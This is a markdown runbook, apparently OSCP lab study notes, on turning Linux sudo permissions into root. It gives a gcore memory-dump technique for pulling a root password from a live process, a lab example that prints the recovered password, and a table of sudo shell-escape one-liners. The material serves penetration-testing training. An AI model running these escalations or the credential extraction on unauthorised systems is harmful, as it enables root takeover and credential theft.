---
tags: [oscp, privesc, linux, sudo, runbook]
box_sources: [Pelican, Payday]
---

# PrivEsc Linux — Sudo

*`sudo -l` shows something. Goal: turn a sudo permission into root.*

---

| Command | Evidence | Works when | Notes | ✅ Go to | ❌ If nothing works |
|---|---|---|---|---|---|
| `sudo -l` | `(ALL) NOPASSWD: /usr/bin/<tool>` | Always run first on any Linux foothold | Lists what the current user can run as root. NOPASSWD = no password required. Cross-reference every allowed binary at GTFOBins. | GTFOBins check → technique below | If it asks for a password and you don't have one, move to other privesc vectors |
| Check [GTFOBins](https://gtfobins.github.io) for the allowed binary | sudo shell escape documented | Binary is on GTFOBins | Filter by "sudo" on GTFOBins. Many standard tools have escape paths (vim, less, find, python, etc.) | Shell as root | Binary isn't on GTFOBins — read the manpage, think about what it can write/exec |
| `sudo gcore <PID>` → `strings core.<PID> \| grep -A 1 "Password:"` | Root password in plaintext | `gcore` is the NOPASSWD allowed binary AND a root process with credentials exists in memory | See full technique below | `strings core.<PID> \| less` — browse manually for anything sensitive |
| `sudo su` | `root@host:#` | `(ALL) ALL` in sudo output — full unrestricted sudo | The best case: user can run everything as any user. No password needed if NOPASSWD, otherwise use their own password. | Done | `sudo -i` or `sudo /bin/bash` as alternatives |

---

## gcore Memory Dump — Full Technique

`gcore` generates a core dump of a live process. If a root-owned process holds credentials in memory (a password manager, a service reading config, etc.), dumping it with sudo extracts those credentials in plaintext.

**Step 1 — Find a root process with likely credentials:**
```bash
ps aux | grep root
```

Look for: `password-store`, `keepass`, any service that reads/stores passwords, anything with obvious credential-adjacent names.

**Step 2 — Dump it:**
```bash
sudo gcore <PID>
```

Output: `Saved corefile core.<PID>`. Ignore "No such file or directory" lines about source files — those are harmless missing debug symbol warnings.

**Step 3 — Extract credentials:**
```bash
strings core.<PID> | grep -i password
strings core.<PID> | grep -A 1 "Password:"
```

If the password is truncated, `-A 1` prints the line after the match — the actual password is often on the next line.

**Pelican example:**
```
root   490   /usr/bin/password-store
sudo gcore 490
strings core.490 | grep -A 1 "Password:"
# → 001 Password: root:
# → ClogKingpinInning731
su root  # → uid=0(root)
```

> 📸 `privesc-finding.png` (sudo -l output + ps aux showing the target process)
> 📸 `privesc-exploit.png` (strings output showing the extracted password)

---

## Other Common sudo Vectors

| Binary | Escape |
|---|---|
| `vim` / `vi` | `:!/bin/bash` |
| `less` | `!bash` |
| `find` | `sudo find / -exec /bin/bash \;` |
| `python` / `python3` | `sudo python3 -c 'import os; os.system("/bin/bash")'` |
| `nmap` (old) | `--interactive` → `!sh` |
| `env` | `sudo env /bin/bash` |
| `awk` | `sudo awk 'BEGIN {system("/bin/bash")}'` |

Full list: [GTFOBins — sudo](https://gtfobins.github.io/#sudo)

---

**Module:** [[18. Linux Privilege Escalation|Linux Privilege Escalation]]
